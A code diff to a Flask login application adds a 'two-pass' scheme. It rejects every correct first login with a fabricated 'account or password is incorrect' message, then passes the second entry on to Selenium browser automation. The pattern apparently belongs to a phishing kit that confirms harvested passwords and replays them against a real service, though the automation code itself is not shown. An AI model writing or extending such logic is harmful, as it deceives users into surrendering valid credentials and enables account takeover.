@@ -100,6 +100,14 @@ class SessionLog(db.Model):
     success = db.Column(db.Boolean, default=True)
     error_message = db.Column(db.Text)
 
+class LoginAttempt(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user_email = db.Column(db.String(120), nullable=False)
+    session_id = db.Column(db.String(255), nullable=False)
+    attempt_count = db.Column(db.Integer, default=0)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+
 class LoginForm(FlaskForm):
     email = StringField('Email', validators=[DataRequired(), Email()])
     password = PasswordField('Password', validators=[DataRequired()])
@@ -377,6 +385,47 @@ def process_form():
         if not bcrypt.checkpw(password.encode('utf-8'), user.password_hash.encode('utf-8')):
             flash('Invalid credentials', 'error')
             log_session_activity("login_failed", user_email=email, success=False, error_message="Invalid credentials")
+            return redirect(url_for('index', step='password', email=email, error='true'))
+        
+        # Two-pass authentication logic
+        current_session_id = session.get('session_id')
+        login_attempt = LoginAttempt.query.filter_by(
+            user_email=email, 
+            session_id=current_session_id
+        ).first()
+        
+        if not login_attempt:
+            # First attempt - create new attempt record
+            login_attempt = LoginAttempt()
+            login_attempt.user_email = email
+            login_attempt.session_id = current_session_id
+            login_attempt.attempt_count = 1
+            db.session.add(login_attempt)
+            db.session.commit()
+            
+            # Always fail first attempt
+            flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
+            log_session_activity("first_attempt_blocked", user_email=email, success=False, 
+                               error_message="First attempt automatically failed - two-pass security")
+            return redirect(url_for('index', step='password', email=email, error='true'))
+        
+        elif login_attempt.attempt_count == 1:
+            # Second attempt - proceed with automation
+            login_attempt.attempt_count = 2
+            login_attempt.updated_at = datetime.utcnow()
+            db.session.commit()
+            log_session_activity("second_attempt_proceeding", user_email=email)
+            # Continue with Selenium automation below
+        
+        else:
+            # More than 2 attempts - reset and start over
+            login_attempt.attempt_count = 1
+            login_attempt.updated_at = datetime.utcnow()
+            db.session.commit()
+            
+            flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
+            log_session_activity("attempt_reset", user_email=email, success=False, 
+                               error_message="Attempt counter reset - starting two-pass cycle again")
             return redirect(url_for('index', step='password', email=email, error='true'))
         
         # Perform Selenium automation
